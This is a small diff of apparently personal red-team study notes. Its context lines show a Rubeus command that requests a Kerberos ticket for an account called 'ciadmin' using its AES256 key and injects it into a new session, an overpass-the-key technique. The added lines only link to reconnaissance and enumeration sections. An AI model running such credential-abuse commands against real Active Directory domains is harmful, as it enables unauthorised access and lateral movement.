@@ -12,3 +12,7 @@ Are u syncing
 ```
 C:\AD\Tools\Rubeus.exe asktgt /user:ciadmin /aes256:<aes256 key of ciadmin> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
+
+[[Reconnaissance (TA0043)]]
+
+[[#Enumeration]] 
